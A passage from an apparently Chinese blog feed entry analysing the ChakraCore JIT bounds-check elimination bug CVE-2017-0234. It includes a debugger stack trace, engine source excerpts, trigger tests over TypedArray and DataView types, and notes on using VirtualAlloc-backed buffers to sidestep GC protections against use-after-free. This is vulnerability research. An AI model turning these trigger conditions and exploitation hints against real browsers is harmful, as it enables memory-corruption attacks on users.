</span><br><span class="line">03 00000030`208feca0 00007ffc`0f0641bd chakracore!_initterm+0x5d [d:\th\minkernel\crts\ucrt\src\appcrt\startup\initterm.cpp @ 22] </span><br><span class="line">04 00000030`208fece0 00007ffc`0f0640b7 chakracore!dllmain_crt_process_attach+0xbd [f:\dd\vctools\crt\vcstartup\src\startup\dll_dllmain.cpp @ 67] </span><br><span class="line">05 00000030`208fed30 00007ffc`0f064345 chakracore!dllmain_crt_dispatch+0x47 [f:\dd\vctools\crt\vcstartup\src\startup\dll_dllmain.cpp @ 133] </span><br><span class="line">06 00000030`208fed70 00007ffc`0f0644c1 chakracore!dllmain_dispatch+0x75 [f:\dd\vctools\crt\vcstartup\src\startup\dll_dllmain.cpp @ 190] </span><br><span class="line">07 00000030`208fedc0 00007ffc`5622485f chakracore!_DllMainCRTStartup+0x31 [f:\dd\vctools\crt\vcstartup\src\startup\dll_dllmain.cpp @ 249] </span><br><span class="line">08 00000030`208fedf0 00007ffc`5624d762 ntdll!LdrpCallInitRoutine+0x6b</span><br><span class="line">09 00000030`208fee60 00007ffc`5624d5ab ntdll!LdrpInitializeNode+0x15a</span><br><span class="line">0a 00000030`208fef80 00007ffc`56247045 ntdll!LdrpInitializeGraphRecurse+0x73</span><br><span class="line">0b 00000030`208fefc0 00007ffc`5621d690 ntdll!LdrpPrepareModuleForExecution+0xc5</span><br><span class="line">0c 00000030`208ff000 00007ffc`5621d273 ntdll!LdrpLoadDllInternal+0x1a4</span><br><span class="line">0d 00000030`208ff080 00007ffc`5621c3cc ntdll!LdrpLoadDll+0x107</span><br><span class="line">0e 00000030`208ff220 00007ffc`5328eb02 ntdll!LdrLoadDll+0x8c</span><br><span class="line">0f 00000030`208ff320 00007ffc`532ba6d1 KERNELBASE!LoadLibraryExW+0x152</span><br><span class="line">10 00000030`208ff390 00007ff6`ee0d5509 KERNELBASE!LoadLibraryExA+0x31</span><br><span class="line">11 00000030`208ff3d0 00007ff6`ee0d55e9 CH!LoadChakraCore+0x19 [d:\chakracore\chakracore\bin\ch\chakrartinterface.cpp @ 38] </span><br><span class="line">12 00000030`208ff400 00007ff6`ee0d51ac CH!ChakraRTInterface::LoadChakraDll+0xd9 [d:\chakracore\chakracore\bin\ch\chakrartinterface.cpp @ 67] </span><br><span class="line">13 00000030`208ff7b0 00007ff6`ee0efee4 CH!wmain+0x61c [d:\chakracore\chakracore\bin\ch\ch.cpp @ 942] </span><br><span class="line">14 00000030`208ff910 00007ff6`ee0efdf7 CH!invoke_main+0x34 [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 80] </span><br><span class="line">15 00000030`208ff950 00007ff6`ee0efcbe CH!__scrt_common_main_seh+0x127 [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 253] </span><br><span class="line">16 00000030`208ff9b0 00007ff6`ee0efef9 CH!__scrt_common_main+0xe [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 296] </span><br><span class="line">17 00000030`208ff9e0 00007ffc`53f92784 CH!wmainCRTStartup+0x9 [f:\dd\vctools\crt\vcstartup\src\startup\exe_wmain.cpp @ 17] </span><br><span class="line">18 00000030`208ffa10 00007ffc`56270d51 KERNEL32!BaseThreadInitThunk+0x14</span><br><span class="line">19 00000030`208ffa40 00000000`00000000 ntdll!RtlUserThreadStart+0x21</span><br></pre></td></tr></table></figure></p><p>于是全局搜索MEM_COMMIT，在ArrayBuffer.h里找到线索，并调试确认。<br>结论如下：<br>在为ArrayBuffer进行内存分配时，会对长度有一个判断。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032016.jpg" alt=""><br>并根据这个判断的返回结果，决定使用Virtual Alloc（AllocWrapper是一个包装）还是malloc来分配内存。<br>这主要是根据length的长度和”标志位“。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032100.jpg" alt=""><br>如果是用Virtual Alloc分配(关于这种分配方式的参数，可以参考<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85" target="_blank" rel="noopener">MSDN</a>.aspx))<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032346.jpg" alt=""><br>那么为ArrayBuffer分配的保留空间大小为4GB<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032430.jpg" alt=""><br>随后COMMIT真正使用的大小，也就是PoC里的0x10000<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032701.jpg" alt=""></p><p>JIT在优化的时候会因为我们给这个Buffer分配的内存足够大（4GB），就去掉了边界检查，但其实这是一个安全隐患。</p><h3 id="Pattern匹配"><a href="#Pattern匹配" class="headerlink" title="Pattern匹配"></a>Pattern匹配</h3><p>我尝试着替换ArrayBuffer，寻找和此处bug逻辑相似的地方，在源码里搜索，不过暂时没有找到疑似的地方。</p><h3 id="触发条件-修改PoC"><a href="#触发条件-修改PoC" class="headerlink" title="触发条件(修改PoC)"></a>触发条件(修改PoC)</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (baseValueType.IsLikelyOptimizedVirtualTypedArray() &amp;&amp; !Js::IsSimd128LoadStore(instr-&gt;m_opcode) <span class="comment">/*Always extract bounds for SIMD */</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">if</span> (isProfilableStElem ||</span><br><span class="line">         !instr-&gt;IsDstNotAlwaysConvertedToInt32() ||</span><br><span class="line">         ( (baseValueType.GetObjectType() == ObjectType::Float32VirtualArray ||</span><br><span class="line">           baseValueType.GetObjectType() == ObjectType::Float64VirtualArray) &amp;&amp;</span><br><span class="line">           !instr-&gt;IsDstNotAlwaysConvertedToNumber()</span><br><span class="line">         )</span><br><span class="line">        )</span><br><span class="line">     &#123;</span><br><span class="line">         eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">         eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">         canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><ol><li>替换控制ArrayBuffer的对象</li><li>测试case</li></ol><h4 id="TypeView"><a href="#TypeView" class="headerlink" title="TypeView"></a>TypeView</h4><p>PoC里用的是Uint32Array，其实TypedView只要宽度大于一个字节都是可以的<br>下面这些都测试成功。（其实主要常用的写exp的还是FloatArray）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Uint8Array();-</span><br><span class="line">Uint16Array();+</span><br><span class="line">Uint32Array();+</span><br><span class="line"></span><br><span class="line">Int8Array();-</span><br><span class="line">Int16Array();+</span><br><span class="line">Int32Array();+</span><br><span class="line"></span><br><span class="line">Float32Array();+</span><br><span class="line">Float64Array();+</span><br></pre></td></tr></table></figure></p><h4 id="DataView"><a href="#DataView" class="headerlink" title="DataView"></a>DataView</h4><ul><li>JSObject<ul><li>JSArray<ul><li>JSArrayBuffer</li><li>JSArrayBufferView<ul><li>JSTypedArray</li><li>JSDataView</li></ul></li></ul></li></ul></li></ul><p>ArrayBuffer需要用TypedArray或DataView来实际访问。<br>而为了Exploit，最好不要做多余的事情（当发生意想不到的事情时很麻烦），因此比起DataView，我们更多的使用TypedArray。<br>不过我这里还是测试了一下DataView，没有成功。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">begin, end, step, num</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = begin; i &lt; end; i += step)</span><br><span class="line">     view.setInt32(i,num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10000</span>);</span><br><span class="line"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer);</span><br><span class="line">write(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">1</span>, <span class="number">0x1234</span>);</span><br><span class="line">write(<span class="number">0x3000000e</span>, <span class="number">0x40000010</span>, <span class="number">0x10000</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ /d/chakracore/ChakraCore/Build/VcBuild/bin/x64_debug/ch.exe test3.js</span><br><span class="line">TypeError: DataView operation access beyond specified buffer length</span><br><span class="line">   at write (d:\cve-2017-0234\test3.js:3:6)</span><br><span class="line">   at Global code (d:\cve-2017-0234\test3.js:9:1)</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-041938.jpg" alt=""><br>全局搜索报错字符串并查找引用寻找原因。<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-042028.jpg" alt=""></p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>在patch后，要触发需要构造常数边界(上面有分析)<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (isProfilableStElem ||</span><br><span class="line">            !instr-&gt;IsDstNotAlwaysConvertedToInt32() ||</span><br><span class="line">            ( (baseValueType.GetObjectType() == ObjectType::Float32VirtualArray ||</span><br><span class="line">              baseValueType.GetObjectType() == ObjectType::Float64VirtualArray) &amp;&amp;</span><br><span class="line">              !instr-&gt;IsDstNotAlwaysConvertedToNumber()</span><br><span class="line">            )</span><br></pre></td></tr></table></figure></p><p>isProfilableStElem显然是JIT优化时用来采集的一个标志，所以通过循环生成JIT的时候就可以走进if body。<br>但是其他和IR有关的“||”选项显然是不能放过的线索，可以测试如何走进这些路径。</p><h3 id="开发者的assumption"><a href="#开发者的assumption" class="headerlink" title="开发者的assumption"></a>开发者的assumption</h3><h4 id="assumption"><a href="#assumption" class="headerlink" title="assumption"></a>assumption</h4><p>如图可知，传入的length的最大长度为MaxArrayBufferLength，length的类型是uint32即最大值2^32-1<br>MaxArrayBufferLength    0x7fffffff    const unsigned int<br>这里即是对要分配的buffer的空间大小的一次校验。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-17-031659.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-17-031809.jpg" alt=""></p><p>而采用VirtualAlloc一次分配的大小是4GB即2^32<br><code>#define MAX_ASMJS_ARRAYBUFFER_LENGTH 0x100000000 //4GB</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-17-031827.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-17-031841.jpg" alt=""><br>然而在通过索引访问buffer的时候，索引的类型也是uint32的。<br>于是若是数组索引，按照单个元素size同比扩容之后，则有可能超过4GB的虚拟内存（即length最大可以申请到4G，但是访问可以是4G*x）。<br>而对于访问超过分配的buffer但是在VirtualAlloc分配的4G内的越界读写会直接会由硬件进行捕获。<br>我推测开发者在写代码的时候，正是没有注意到这一点，于是只是简单的出于性能优化的考虑，错误的判断了索引无论如何都不可能超出保留的大空间越界访问（因为4G是“最大”了，而在4G内的越界访问都会被硬件捕获并终止）<br>于是就直接去掉了边界。 </p><h4 id="other"><a href="#other" class="headerlink" title="other"></a>other</h4><p>最简单也是最常见的可优化边界检查代码就是处在循环里的边界检查。</p><p>我们假设循环具有迭代变量i，且初值为init, 终值为fin，i++<br>只有循环控制代码修改i<br>假设必须要满足的范围是<code>lo &lt; i &lt; hi</code><br>本来循环应该是这样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    i &lt;- init</span><br><span class="line">L1: ...</span><br><span class="line">    if i &lt; lo trap</span><br><span class="line">    if i &gt; hi trap</span><br><span class="line">    use of i that must satisfy lo &lt;= i &lt;=hi</span><br><span class="line">    ....</span><br><span class="line">    i &lt;- i + 1</span><br><span class="line">    if i &lt;= fin goto L1</span><br></pre></td></tr></table></figure></p><p>最容易处理的情况是i为常量v，则只需要将检查lo &lt; i &lt; hi的代码外提到循环的前置块里即可</p><p>下一种稍微复杂一点的情况是i为变量，这样我们就要处理范围表达式lo &lt; i &lt; hi（比如说分配的数组最大空间不超过hi，最小不小于0）<br>其中i是循环控制变量，在这种情况下，只需要lo &lt; init且 fin &lt; hi ， 就能满足范围表达式<br>于是我们可以这么做<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    if lo &gt; init trap (i的初始值为init，如果init 比 i需满足的最小值还小，则trap</span><br><span class="line">    t1 &lt;- min(fin, hi)</span><br><span class="line">    i &lt;- init</span><br><span class="line">L1: ...</span><br><span class="line">    use of i that must satisfy lo &lt;= i &lt;= hi</span><br><span class="line">    ....</span><br><span class="line">    i &lt;- i + 1</span><br><span class="line">    if i &lt;= t1 goto L1</span><br><span class="line">    if i &lt;= fin trap 6(i本应该到达fin，如果i不能到达它本来应该到达的值，就trap</span><br></pre></td></tr></table></figure></p><h3 id="GC和VirtualAlloc在安全性上的区别"><a href="#GC和VirtualAlloc在安全性上的区别" class="headerlink" title="GC和VirtualAlloc在安全性上的区别"></a>GC和VirtualAlloc在安全性上的区别</h3><h4 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h4><p>UAF(Use After Free)：即释放后使用。将Dangling pointer所指向的内存重新分配回来，且尽可能使该内存中的内容可控</p><h4 id="MemGC"><a href="#MemGC" class="headerlink" title="MemGC"></a>MemGC</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-24-100435.jpg" alt=""><br>如图，对象A申请了一个数据块，当释放这个数据块时，若还有其他对象引用这个数据块，那么MemGC不会回收利用，其他程序无法将数据写入这个数据块，从而阻止了UAF漏洞的利用；若没有其他对象引用这个数据块，就不存在UAF漏洞了。</p><h4 id="标记清除法"><a href="#标记清除法" class="headerlink" title="标记清除法"></a>标记清除法</h4><p>标记清除（Mark and Sweep）是最早开发出的GC算法（1960年）。它的原理非常简单，首先从根开始将可能被引用的对象用递归的方式进行标记，然后将没有标记到的对象作为垃圾进行回收。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-24-100040.jpg" alt=""><br>图显示了标记清除算法的大致原理。<br>图中（1）部分显示了随着程序的运行而分配出一些对象的状态，一个对象可以对其他的对象进行引用。<br>图中（2）部分中，GC开始执行，<strong>从根开始对可能被引用的对象打上标记</strong>，大多数情况下，这种标记是通过对象内部的标志（Flag）来实现的。于是，被标记的对象我们把它们涂黑。<br>图中（3）部分中，被标记的对象所能够引用的对象也被打上标记。重复这一步骤的话，就可以将从根开始可能被间接引用到的对象全部打上标记。到此为止的操作，称为标记阶段（Mark phase）。<br>标记阶段完成时，被标记的对象就被视为“存活”对象。<br>图中（4）部分中，将全部对象按顺序扫描一遍，将没有被标记的对象进行回收。这一操作被称为清除阶段（Sweep phase）。<br>在扫描的同时，还需要将存活对象的标记清除掉，以便为下一次GC操作做好准备。标记清除算法的处理时间，是和存活对象数与对象总数的总和相关的。</p><h4 id="GC和VirtualAlloc在安全性上的区别-1"><a href="#GC和VirtualAlloc在安全性上的区别-1" class="headerlink" title="GC和VirtualAlloc在安全性上的区别"></a>GC和VirtualAlloc在安全性上的区别</h4><p>VirtualAlloc是裸的内存分配释放，并没有对UAF加以缓解。<br>而通过控制ArrayBuffer的length(&gt;0x10000)，我们可以选择通过VirtualAlloc来分配内存，于是就“绕开”了GC的保护，就有可能通过UAF来完成利用。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过分析Root Cause，并进一步通过对Assumption的思考，对patch的分析，相关知识由点及面的学习，并最后在脆弱性上进行考虑，找出可行的利用点，思考的深度有所提升。</p><h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h3><h4 id="Windbg常用命令"><a href="#Windbg常用命令" class="headerlink" title="Windbg常用命令"></a>Windbg常用命令</h4><ul><li>dd memory<br>打印内存</li><li>u<br>打印汇编</li><li>k<br>查看堆栈<h4 id="一些trick"><a href="#一些trick" class="headerlink" title="一些trick"></a>一些trick</h4></li></ul><ol><li>寻找JIT代码，定位CallLoopBody，它的参数就是JIT代码地址。</li><li>寻找生成JIT代码的地方可以考虑在Func::Codegen那里下断。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;vs调试环境配置&quot;&gt;&lt;a href=&quot;#vs调试环境配置&quot; class=&quot;headerlink&quot; title=&quot;vs调试环境配置&quot;&gt;&lt;/a&gt;vs调试环境配置&lt;/h3&gt;&lt;h4 id=&quot;编译&quot;&gt;&lt;a href=&quot;#编译&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="edge" scheme="http://eternalsakura13.com/tags/edge/"/>
    
  </entry>
  
</feed>
